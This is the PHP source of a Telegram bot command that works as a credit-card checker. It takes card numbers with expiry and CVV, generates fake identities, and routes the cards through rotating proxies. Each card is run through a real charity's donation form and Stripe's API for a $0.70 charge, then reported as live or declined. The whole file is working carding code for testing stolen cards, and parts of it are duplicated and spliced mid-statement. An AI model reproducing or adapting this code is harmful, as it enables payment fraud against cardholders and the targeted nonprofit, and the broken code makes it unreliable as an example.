<?php
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else { 
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); //
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; // add to free users list
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else    $currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else {
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); 
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; 
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    } {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    }
//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//

//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/ax|\.ax|!ax)/', $text)) {
    $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username You're not Premium user❌</b>", $message_id);
      exit();
    }
$start_time = microtime(true);

  $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";

//=======WHO CAN CHECK END========//

//====ANTISPAM AND WRONG FORMAT====//
    if (strlen($message) <= 4) {
            sendMessage($chatId, '<b>• Wrong Format! ⚠️</b>%0A• 𝘚𝘦𝘯𝘥 <code>/chk cc|mm|yy|cvv</code>%0A• 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 <code>Stripe Charge 1 USD</code>', $message_id);
            exit();
  }
$r = "0";

$r = rand(0, 100);
//==ANTISPAM AND WRONG FORMAT END==//



//==ANTISPAM AND WRONG FORMAT END==//


//=======checker part start========//
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


$lista = substr($message, 5);
$separa = explode("|", $lista);
$cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
$mes = isset($separa[1]) ? $separa[1] : '';
$ano = isset($separa[2]) ? $separa[2] : '';
$cvv = isset($separa[3]) ? $separa[3] : '';


$last4 = substr($cc, -4);


$sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■□□□□ 20%🟣
[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★  2001 Insufficient Funds?
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username/<code>[$rank]</code>
━━━━━━━━━━━━━━━━━━</b>");

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];




sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>

━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■□□□ 40%🔴
[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ 81724: Duplicate card exists?
━━━━━━━━━
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username/<code>[$rank]</code>

━━━━━━━━━━━━━━━━━━</b>");

  //==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//
sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>

━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■■□□ 60%🔵
[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ 2044: Declined - Call Issuer?
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username/<code>[$rank]</code>

━━━━━━━━━━━━━━━━━━</b>");


  //==================[BIN LOOK-UP]======================//

  $bin = substr($lista, 0,6);
  $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = strtoupper(GetStr($fim, '"name":"', '"'));
$brand = strtoupper(GetStr($fim, '"brand":"', '"'));
$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
$scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
$emoji = GetStr($fim, '"emoji":"', '"');
$type =strtoupper(GetStr($fim, '"type":"', '"'));
   //IF BIN ARE NOT AVAILABLE ----//
    if (empty($scheme)) {
        $scheme = "N/A";
    }
    if (empty($type)) {
        $type = "N/A";
    }
    if (empty($brand)) {
        $brand = "N/A";
    }
    if (empty($bank)) {
        $bank = "N/A/N/A";
    }
    if (empty($name)) {
        $name = "N/A";
    }
    if (empty($emoji)) {
        $emoji = "N/A";
    }
    if (empty($currency)) {
        $currency = "N/A";
    }


//==================[BIN LOOK-UP-END]======================//



sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■■■□ 80%🟠
[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ cvv: Gateway Rejected: cvv?
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username/<code>[$rank]</code>
 
━━━━━━━━━━━━━━━━━━</b>");
//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.azbengal.org/donation/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /donation/ h2',
'Host: www.azbengal.org',
'cache-control: max-age=0',
'upgrade-insecure-requests: 1',
'origin: https://www.azbengal.org',
'content-type: multipart/form-data; boundary=----WebKitFormBoundarySKGPWq3q2cHft5yO',
'user-agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'x-requested-with: com.xbrowser.play',
'sec-fetch-site: same-origin',
'sec-fetch-mode: navigate',
'sec-fetch-user: ?1',
'sec-fetch-dest: document',
'referer: https://www.azbengal.org/donation/',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8',
));
$r1 = curl_exec($ch);
$vh = trim(strip_tags(getStr($r1,'{"common":{"form":{"honeypot":{"version_hash":"','"'))); 
$gkey = trim(strip_tags(getStr($r1,"input type='hidden' class='gform_hidden' name='gform_unique_id' value='","'"))); 
$hdval = trim(strip_tags(getStr($r1,"<input type='hidden' class='gform_hidden' name='state_6' value='","'")));
$nonce = trim(strip_tags(getStr($r1,'"create_payment_intent_nonce":"','"'))); 

//echo $nonce;
////////////////////////////===[1ST CURL]
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
//curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'accept: application/json',
'user-agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'x-requested-with: com.xbrowser.play',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8',

));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
///&card[cvc]='.$cvv.'
////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=Badbou&billing_details[address][postal_code]=90023&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=f760b15e-bab4-4824-9c74-73ad9684fe6bc93c7d&muid=e216cb05-dbb9-4c47-8ed0-77a83870842b52b19a&sid=880fbd04-8e30-4c23-8e8d-3f534b1eb22c630a1d&pasted_fields=number&payment_user_agent=stripe.js%2F3007153515%3B+stripe-js-v3%2F3007153515%3B+card-element&referrer=https%3A%2F%2Fwww.azbengal.org&time_on_page=107217&key=pk_live_51KYYJDIvITdPgOSeT9xDWU6aXG0fqjC4FtawCwCWMifUYr4INiifGwy4nxzb0xTO7HrPLzSfOozajfXxqXtUcvbc00x8u770F6');

 $result1 = curl_exec($ch);
  $l4 = trim(strip_tags(getStr($result1,'"last4": "','"')));
  $crt = trim(strip_tags(getStr($result1,'"created": "','"')));
  $brnd = trim(strip_tags(getStr($result1,'"brand": "','"')));
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
//$card = trim(strip_tags(getStr($result1,'"card": { "id": "','"')));
//echo $card;
$id;


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.azbengal.org/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php h2',
'Host: www.azbengal.org',
'accept: application/json, text/javascript, */*; q=0.01',
'x-requested-with: XMLHttpRequest',
'user-agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://www.azbengal.org',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://www.azbengal.org/donation/',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8',
));

////////////////////////////===[2 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS,'action=gfstripe_create_payment_intent&nonce='.$nonce.'&payment_method%5Bid%5D='.$id.'&payment_method%5Bobject%5D=payment_method&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcity%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline1%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline2%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bpostal_code%5D=90023&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bstate%5D=&payment_method%5Bbilling_details%5D%5Bemail%5D=&payment_method%5Bbilling_details%5D%5Bname%5D=Badbou&payment_method%5Bbilling_details%5D%5Bphone%5D=&payment_method%5Bcard%5D%5Bbrand%5D=visa&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_line1_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_postal_code_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Bcvc_check%5D=&payment_method%5Bcard%5D%5Bcountry%5D=US&payment_method%5Bcard%5D%5Bexp_month%5D='.$mes.'&payment_method%5Bcard%5D%5Bexp_year%5D='.$ano.'&payment_method%5Bcard%5D%5Bfunding%5D=debit&payment_method%5Bcard%5D%5Bgenerated_from%5D=&payment_method%5Bcard%5D%5Blast4%5D='.$l4.'&payment_method%5Bcard%5D%5Bnetworks%5D%5Bavailable%5D%5B%5D=visa&payment_method%5Bcard%5D%5Bnetworks%5D%5Bpreferred%5D=&payment_method%5Bcard%5D%5Bthree_d_secure_usage%5D%5Bsupported%5D=true&payment_method%5Bcard%5D%5Bwallet%5D=&payment_method%5Bcreated%5D='.$crt.'&payment_method%5Bcustomer%5D=&payment_method%5Blivemode%5D=true&payment_method%5Btype%5D=card&currency=USD&amount=70&feed_id=6');

$result2 = curl_exec($ch);
$pi = trim(strip_tags(getStr($result2,'"id":"','"')));
$scrt = trim(strip_tags(getStr($result2,'"client_secret":"','"')));
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.azbengal.org/donation/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /donation/ h2',
'Host: www.azbengal.org',
'cache-control: max-age=0',
'upgrade-insecure-requests: 1',
'origin: https://www.azbengal.org',
'content-type: multipart/form-data; boundary=----WebKitFormBoundarySKGPWq3q2cHft5yO',
'user-agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'x-requested-with: com.xbrowser.play',
'sec-fetch-site: same-origin',
'sec-fetch-mode: navigate',
'sec-fetch-user: ?1',
'sec-fetch-dest: document',
'referer: https://www.azbengal.org/donation/',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8',
));

////////////////////////////===[2 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS,'------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="input_1.3"

Badboy
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="input_1.6"

Chk
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="input_2"

gsixchit@gmail.com
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="input_3"

(304) 648-6468
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="input_7"

$0.70
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="input_6.5"

Badbou
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="is_submit_6"

1
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="gform_submit"

6
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="gform_unique_id"


------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="state_6"

WyJ7XCI4XCI6W1wiNTFjNDZmOWU4ZDEyMDE1NWQ5MDQwOGRkNzQ4OWQyN2RcIl19IiwiZDA2YTY0MmM3MDI2YzhjNjNjNDM0NzVhZjcxZjE3YTciXQ==
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="gform_target_page_number_6"

0
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="gform_source_page_number_6"

1
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="gform_field_values"


------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="pum_form_popup_id"

8663
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="stripe_response"

{"id":"'.$pi.'","client_secret":"'.$scrt.'","amount":70}
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="stripe_credit_card_last_four"

'.$l4.'
------WebKitFormBoundarySKGPWq3q2cHft5yO
Content-Disposition: form-data; name="stripe_credit_card_type"

'.$brnd.'
------WebKitFormBoundarySKGPWq3q2cHft5yO--');

 $result3 = curl_exec($ch);
    $msg5 = trim(strip_tags(getStr($result3,'There was a problem with your submission:','.')));
$msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));
if(empty($msg))
{
  $msg = $msg5;
}

//==================req 2 end===============//



sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■■■■ 99%🟢
[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ cvv: Gateway Rejected: cvv?
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username/<code>[$rank]</code> 
━━━━━━━━━━━━━━━━━━</b>");
$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);

  //======checker part end=========//


if (
    strpos($result3, 'Thank you for your donation of') !== false ||
    strpos($result3, 'Membership confirmed.') !== false ||
    strpos($result3, 'Membership Confirmation') !== false ||
    strpos($result3, 'Thanks for your donation! Please check your email for a receipt.') !== false ||
    strpos($result3, 'incorrect_zip') !== false ||
    strpos($result3, 'Success ') !== false ||
    strpos($result3, '"type":"one-time"') !== false ||
    strpos($result3, '/donations/thank_you?donation_number=') !== false
) {

  $resp = "<b>
𝘾𝘾𝙉 𝘾𝙃𝘼𝙉𝙂𝙀 0.7$ ✅
═════『』═════
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ <code> Live 🟢 </code>
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code> Thanks for your donation!. </code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>


</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result3, "Your card has insufficient funds.") || strpos($result3, "insufficient_funds")) {


$resp = "<b>
𝘾𝘾𝙉 𝘾𝙃𝘼𝙉𝙂𝙀 0.7$ ✅
═════『』═════
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ <code> Live 🟢 </code>
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code> insufficient funds. </code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>


</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif(strpos($result3, 'security code is incorrect.') !== false || strpos($result3, 'security code is invalid.') !== false || strpos($result3, "incorrect_cvc") !== false) {
$resp = "<b>
𝘾𝘾𝙉 𝘾𝙃𝘼𝙉𝙂𝙀 0.7$ ✅
═════『』═════
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ <code> Live 🟢 </code>
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code> incorrect_cvc </code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
